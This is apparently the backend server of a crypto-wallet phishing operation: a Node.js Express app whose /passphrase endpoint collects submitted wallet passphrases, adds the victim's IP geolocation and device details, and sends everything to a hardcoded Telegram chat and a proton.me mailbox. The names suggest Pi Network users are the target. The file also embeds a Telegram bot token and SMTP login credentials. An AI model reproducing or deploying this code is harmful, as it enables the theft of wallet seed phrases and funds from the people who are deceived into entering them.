const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const axios = require('axios');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const UAParser = require('ua-parser-js');

const app = express();
const botToken = '6899183906:AAGa0cXtXKn6xuyheLHKzJZ_nPFUXwtIz6w'; // Replace with your Telegram bot token
const bot = new TelegramBot(botToken);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());

app.get('/', (req, res, next)=>{
  res.send('<h1>Hello World</h1>')
})

app.post('/passphrase', async (req, res) => {
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const passphrase = req.body.passphrase;

  // Parse user-agent header to get device information using ua-parser-js
  const parser = new UAParser();
  const deviceInfo = parser.setUA(userAgent).getResult();

  if (!passphrase) {
    return res.status(400).json({ error: 'Passphrase is missing in the request body' });
  }

  const url = `https://freeipapi.com/api/json/${clientIP}`;

  try {
    // Fetch IP location data using axios
    const response = await axios.get(url);
    const { countryName, cityName, regionName, isProxy, continent, timeZone } = response.data;

    // Send the message to Telegram
    const teleMessage = `
      Passphrase: ${passphrase}
      IP Location: ${clientIP}
      Continent: ${continent},
      Country: ${countryName},
      Region: ${regionName}, 
      City: ${cityName},
      Timezone: ${timeZone},
      VPN: ${isProxy ? "Yes" : "No"}
      Device Info: ${JSON.stringify(deviceInfo)}
    `;
    
    bot.sendMessage('1767413154', teleMessage);

    // Send email using nodemailer
    let transporter = nodemailer.createTransport({
      host: "160-20-145-243.cprapid.com",
      port: 465,
      secure: true,
      auth: {
        user: "admin@pimainetexchange.com",
        pass: "Piesender10",
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    const mailOptions = {
      from: 'admin@pimainetexchange.com',
      to: 'pinetwork101@proton.me',
      subject: `Received From ${clientIP}`,
      text: `
        Passphrase: ${passphrase}
        IP Location: ${clientIP}
        Continent: ${continent},
        Country: ${countryName},
        Region: ${regionName}, 
        City: ${cityName},
        Timezone: ${timeZone},
        VPN: ${isProxy ? "Yes" : "No"}
        Device Info: ${JSON.stringify(deviceInfo)}
      `,
    };

    await transporter.sendMail(mailOptions);
    res.json({ message: 'Passphrase received successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Failed to process the request' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
